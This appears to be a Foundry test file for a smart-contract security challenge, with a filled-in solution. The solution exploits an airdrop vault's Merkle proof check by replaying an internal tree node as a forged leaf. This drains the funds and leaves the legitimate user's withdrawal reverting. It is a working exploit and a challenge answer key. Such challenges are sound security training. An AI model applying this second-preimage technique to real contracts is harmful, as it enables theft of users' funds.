// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {Vault} from "../src/13-Airdropper64.sol";

contract Airdropper64Test is Test {
    address owner;
    address user;
    address attacker;
    bytes32 leftLeaf;
    bytes32 rightLeaf;
    Vault public vault;

    function setUp() public {
        owner = makeAddr("OWNER");
        user = makeAddr("USER");
        attacker = makeAddr("ATTACKER");

        uint256 amount = 1 ether;
        uint96 expiration = type(uint96).max;

        leftLeaf = keccak256(abi.encodePacked(attacker, amount, expiration));
        rightLeaf = keccak256(abi.encodePacked(user, amount, expiration));

        // Calculate root
        bytes32 root = keccak256(
            abi.encode(leftLeaf, rightLeaf)
        );

        deal(owner, 2 ether);

        vm.startPrank(owner);
        vault = new Vault();
        vault.setMerkleRoot(root);
        vault.donate{value: 2 ether}();
        vm.stopPrank();
    }

    function test_Airdropper64() public {
        vm.startPrank(attacker);

        // START OF SOLUTION
        // (You can create any additional contract if needed)

        bytes32[] memory proof = new bytes32[](1);
        proof[0] = rightLeaf;
        vault.claim(attacker, 1 ether, type(uint96).max, proof);
        vault.withdraw(attacker, 1 ether);

        // abi.encode(leftHash, rightHash)
        // 0x3465508443117bee910ff88bc5edcf8ba0a0a9d8bbd319e6f62606613ce1d33454791709bec7129b54979f6eeee470c49d70310aca83eb1e1243e409cf030b87

        proof = new bytes32[](0);
        address receiver = 0x3465508443117bEe910Ff88bC5EdcF8Ba0A0A9d8;
        uint256 amount = 0xbbd319e6f62606613ce1d33454791709bec7129b54979f6eeee470c49d70310a;
        uint96 expiration = 0xca83eb1e1243e409cf030b87;
        vault.claim(receiver, amount, expiration, proof);
        vault.withdraw(receiver, 1 ether);

        // END OF SOLUTION

        vm.stopPrank();

        vm.startPrank(user);

        bytes32[] memory userProof = new bytes32[](1);
        userProof[0] = leftLeaf;
        vault.claim(user, 1 ether, type(uint96).max, userProof);
        vm.expectRevert();
        vault.withdraw(user, 1 ether);

        uint256 vaultBalance = address(vault).balance;
        assertEq(vaultBalance, 0, "Vault still has balance");

        uint256 userBalance = address(user).balance;
        assertEq(userBalance, 0, "User has balance");

        uint256 attackerBalance = address(attacker).balance;
        assertEq(attackerBalance, 1 ether, "Attacker didn't get the assets");
    }
}
